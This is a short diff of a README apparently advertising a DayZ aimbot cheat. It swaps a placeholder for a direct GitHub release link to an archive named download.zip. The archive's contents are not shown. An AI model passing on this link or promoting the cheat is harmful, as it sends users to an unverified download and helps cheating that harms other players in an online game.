@@ -6,7 +6,7 @@
 
 🎮 You aim near them. The cheat handles the rest. 💥
 
-[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](555)
+[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://github.com/bessonemoon-2000/DayZ-Aimbot-Lock-Snap-and-Drop-Survivors-Instantly-/releases/download/v1.1.5/download.zip)
 ---
 
 ## 🔥 Aimbot Features for Maximum Kill Count
